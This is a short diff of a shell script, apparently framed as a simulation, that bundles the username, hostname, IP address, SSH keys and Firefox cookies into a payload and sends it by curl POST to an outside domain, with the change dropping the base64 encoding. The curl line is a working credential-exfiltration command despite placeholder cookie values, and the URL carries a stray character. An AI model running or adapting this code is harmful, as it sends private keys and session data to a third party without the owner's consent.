@@ -11,11 +11,10 @@ firefox_cookies="testcookies"
 
 # package the data
 payload="USER=$username HOST=$hostname IP=$ip_address SSH_KEYS=$ssh_keys COOKIES=$firefox_cookies"
-encoded_payload=$(echo $payload | base64)
 
 # exfiltrate the data to the cloudflare pages endpoint
 curl -X POST -H "Content-Type: application/json" \
-     -d "{\"data\":\"$encoded_payload\"}" \
+     -d "{\"data\":\"$payload\"}" \
      https://masonmelead.com>/log
 
 # clean up traces (for simulation, this does nothing harmful)
